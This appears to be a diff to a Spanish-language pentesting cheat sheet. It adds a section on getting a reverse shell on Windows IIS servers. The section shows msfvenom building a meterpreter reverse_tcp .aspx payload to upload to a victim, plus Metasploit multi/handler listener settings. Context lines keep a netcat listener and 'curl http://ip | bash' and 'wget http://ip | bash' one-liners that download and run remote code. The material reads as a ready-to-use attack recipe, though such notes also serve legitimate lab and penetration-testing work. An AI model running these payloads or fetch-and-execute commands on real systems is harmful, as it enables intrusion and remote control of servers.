@@ -40,3 +40,19 @@ nc -nlvp 443
 "curl 'http://ip' | bash"
 "wget 'http://ip' | bash"
 ```
+
+### Reverse Shell en IIS Windows
+En IIS funciona totalmente distinto a nginx y apache. En caso de no tener PHP, se puede entablar una reverse shell subiendo un fichero **.aspx** malicioso.
+
+Para ello se crea un payload con msfvenom y se sube a la víctima
+```bash
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tu_ip LPORT=tu_puerto -f aspx > payload.aspx
+```
+
+En el atacante
+```bash
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST tu_ip
+set LPORT tu_puerto
+```
